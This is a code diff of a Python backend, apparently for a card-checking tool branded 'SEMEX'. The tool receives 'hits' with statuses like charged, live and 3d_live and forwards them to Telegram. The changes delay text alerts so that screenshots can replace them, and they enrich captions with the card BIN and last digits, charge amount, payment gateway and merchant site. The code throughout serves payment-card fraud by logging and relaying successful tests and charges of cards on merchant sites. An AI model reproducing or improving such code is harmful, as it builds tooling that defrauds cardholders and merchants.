@@ -225,7 +225,7 @@ def _extract_card(card_raw) -> dict:
 
 
 _RECENT_HIT_DEDUP: dict[str, float] = {}
-_HIT_DEDUP_WINDOW_SEC = 8.0
+_HIT_DEDUP_WINDOW_SEC = 30.0   # Extended: catches slow extension retries / double-detects
 
 
 def _extract_client_ip(request: Request) -> str | None:
@@ -500,6 +500,12 @@ async def submit_status(
     # `forward_id` uniquely identifies this submission; per-destination dedup
     # keys make enqueue idempotent (a re-submitted duplicate can't double-send).
     forward_id = uuid.uuid4().hex
+    # When no screenshot was captured before the submit, delay the text-only
+    # notification by TEXT_ONLY_DELAY_SECONDS. The /screenshot follow-up has that
+    # window to arrive and upgrade the pending text item to a photo in-place,
+    # eliminating the text+photo "two hits" users see in Telegram.
+    # Photos (screenshot already attached) and non-forwardable hits get no delay.
+    _text_delay = telegram_outbox.TEXT_ONLY_DELAY_SECONDS if (should_forward and not body.screenshot) else 0.0
 
     async def _enqueue_forward(chat_id, msg_text: str, *, pin: bool, key_prefix: str, with_photo: bool = None) -> None:
         """Enqueue a text-or-photo forward, mirroring the previous inline logic:
@@ -514,18 +520,25 @@ async def submit_status(
                 if _visible_len(msg_text) > 1024:
                     await telegram_outbox.enqueue_photo(
                         db, chat_id, body.screenshot, _photo_caption(msg_text),
-                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo")
+                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo",
+                        submit_id=body.submitId)
+                    # Detail text follows the photo — no delay (photo already sent)
                     await telegram_outbox.enqueue_message(
                         db, chat_id, msg_text,
                         dedup_key=f"{forward_id}:{key_prefix}:text")
                 else:
                     await telegram_outbox.enqueue_photo(
                         db, chat_id, body.screenshot, msg_text,
-                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo")
+                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo",
+                        submit_id=body.submitId)
             else:
+                # Text-only: store submit_id so /screenshot can upgrade this to a
+                # photo, and delay delivery to give the screenshot time to arrive.
                 await telegram_outbox.enqueue_message(
                     db, chat_id, msg_text, pin=pin,
-                    dedup_key=f"{forward_id}:{key_prefix}:text")
+                    dedup_key=f"{forward_id}:{key_prefix}:text",
+                    submit_id=body.submitId,
+                    delay_seconds=_text_delay)
         except Exception as e:
             log.warning("outbox enqueue (%s) failed: %s", key_prefix, e)
 
@@ -631,40 +644,72 @@ async def submit_screenshot(body: ScreenshotBody, user: User = Depends(get_curre
         except Exception:
             pass
 
-    # Photo follow-up caption — short, always under Telegram's 1024 cap. LIVE
-    # hits are never persisted, so fall back to request fields when no hit row.
     hitd = hit or {}
-    status_up = ((body.status or hitd.get("status") or "HIT")).upper()
+    _SHOT_FORWARDABLE = {"charged", "success", "approved", "succeeded", "captured", "live", "ccn_live", "3d_live"}
+    _status_raw = (body.status or hitd.get("status") or "").lower()
+    if _status_raw not in _SHOT_FORWARDABLE:
+        # Screenshot attached to hit row above for the dashboard; no Telegram photo
+        # for non-forwardable statuses (dead / declined / error).
+        return {"success": True, "forwarded": False}
+
+    is_admin = user.is_admin or (user.telegram_id == settings.ADMIN_TELEGRAM_ID)
+
+    # ── PRIMARY PATH: upgrade any pending text-only outbox items to photos ──────
+    # When the initial hit notification went out as a text message (screenshot
+    # capture failed before /status was called), those outbox items are held back
+    # for TEXT_ONLY_DELAY_SECONDS and tagged with submit_id. Upgrading them here
+    # means ONE photo with full details reaches Telegram, not text+photo (which
+    # users see as two duplicate hits).
+    if body.submitId:
+        upgraded = await telegram_outbox.upgrade_pending_to_photo(
+            db, body.submitId, body.screenshot)
+        if upgraded > 0:
+            telegram_outbox.kick()
+            return {"success": True, "upgraded": upgraded}
+
+    # ── FALLBACK PATH: pending items already delivered as text ──────────────────
+    # Build a richer caption (more detail than the old 3-line version) so the
+    # follow-up photo gives the owner useful context even though they already
+    # received the text notification.
+    status_up = _status_raw.upper()
+    _is_charged_shot = _status_raw in {"charged", "success", "approved", "succeeded", "captured"}
+    status_em = "✅" if _is_charged_shot else "🔥"
     site = body.siteUrl or hitd.get("site_url") or hitd.get("hostname") or ""
     card_num = hitd.get("card_number") or ""
     card4 = ("…" + card_num[-4:]) if card_num else ""
-    caption = f"⚜️ <b>SEMEX</b> — {html.escape(status_up)} 📸"
-    if card4:
-        caption += f"\n⚜️Card ➔ <code>{html.escape(card4)}</code>"
+    bin_prefix = hitd.get("bin") or ""
+    card_display = html.escape(bin_prefix + card4) if (bin_prefix or card4) else ""
+    amount = hitd.get("amount")
+    currency = hitd.get("currency") or ""
+    gateway = hitd.get("gateway") or ""
+
+    caption = f"⚜️ <b>SEMEX</b> — {html.escape(status_up)} {status_em} 📸"
+    if card_display:
+        caption += f"\n⚜️Card ➔ <code>{card_display}</code>"
+    if amount is not None:
+        try:
+            amt_str = f"{float(amount):,.2f}"
+        except (TypeError, ValueError):
+            amt_str = str(amount)
+        caption += f"\n⚜️Amount ➔ <code>{html.escape(amt_str)} {html.escape(currency)}</code>"
+    if gateway:
+        caption += f"\n⚜️Gateway ➔ {html.escape(str(gateway))}"
     if site:
         caption += f"\n⚜️Site ➔ {html.escape(str(site))[:120]}"
 
     shot_key = body.submitId or body.hitId or uuid.uuid4().hex
-    is_admin = user.is_admin or (user.telegram_id == settings.ADMIN_TELEGRAM_ID)
-    # v2.9.4: never DM a photo for non-forwardable statuses (dead/declined/
-    # error). The screenshot is still attached to the hit row above for the
-    # dashboard — only the Telegram photo is gated. This endpoint bypasses the
-    # /status forward gate, so it must apply the same rule itself.
-    _SHOT_FORWARDABLE = {"charged", "success", "approved", "succeeded", "captured", "live", "ccn_live", "3d_live"}
-    if ((body.status or hitd.get("status") or "")).lower() not in _SHOT_FORWARDABLE:
-        return {"success": True, "forwarded": False}
     tasks = [
         telegram_outbox.enqueue_photo(db, user.telegram_id, body.screenshot, caption,
-                                      dedup_key=f"shot:{shot_key}:user")
+                                      dedup_key=f"shot:{shot_key}:user",
+                                      submit_id=body.submitId)
     ]
     if not is_admin:
         tasks.append(
             telegram_outbox.enqueue_photo(db, settings.ADMIN_LOG_CHANNEL_ID, body.screenshot, caption,
-                                          dedup_key=f"shot:{shot_key}:admin")
+                                          dedup_key=f"shot:{shot_key}:admin",
+                                          submit_id=body.submitId)
         )
-    # return_exceptions: one destination's insert failure must not cancel the
-    # other or turn into a 500 (enqueue itself already swallows+logs, this is
-    # belt-and-braces against gather cancellation semantics).
+    # return_exceptions: one destination's failure must not cancel the other.
     await asyncio.gather(*tasks, return_exceptions=True)
     telegram_outbox.kick()
     return {"success": True}
